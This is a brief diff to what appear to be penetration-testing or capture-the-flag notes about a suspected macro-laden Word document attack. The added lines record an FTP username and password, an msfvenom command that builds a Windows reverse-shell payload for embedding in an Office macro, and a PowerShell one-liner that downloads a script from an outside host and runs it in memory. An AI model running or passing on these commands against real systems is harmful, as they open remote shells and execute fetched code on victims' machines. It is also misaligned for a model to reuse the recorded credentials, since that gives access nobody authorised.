@@ -4,4 +4,9 @@ NOTES
 
 Likely a macro docx attack
 
-username: "editor" and the password "MyEditWork"
+ftp username: "editor" and the password "MyEditWork"
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.187 LPORT=9001 -f hta-psh | grep \"powershell | cut -d \" -f 2 > payload; python payload.py
+generate the macro to place into the office file
+
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
